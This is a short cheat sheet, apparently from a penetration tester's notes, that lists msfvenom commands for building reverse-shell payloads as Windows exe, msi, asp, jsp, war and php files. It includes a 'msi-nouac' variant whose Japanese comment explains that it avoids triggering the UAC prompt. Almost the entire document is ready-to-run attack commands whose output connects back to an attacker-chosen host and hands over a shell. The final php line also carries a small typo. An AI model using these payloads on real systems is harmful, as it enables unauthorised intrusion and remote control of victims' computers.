---
title: msfvenom
---
# Create Reverse Shell

## EXE(64)

```zsh
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shellx64.exe
```

## EXE(32)

```zsh
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shellx86.exe
```

## msi

```zsh
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > shellx86.msi
```

```zsh
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi-nouac > shell.msi
```

- msi-nouac: 管理者権限を要求しないことでUACをださない

## asp

```zsh
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```

## jsp

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
```

## war

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
```

## php

```
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT>- f raw > shell.php
```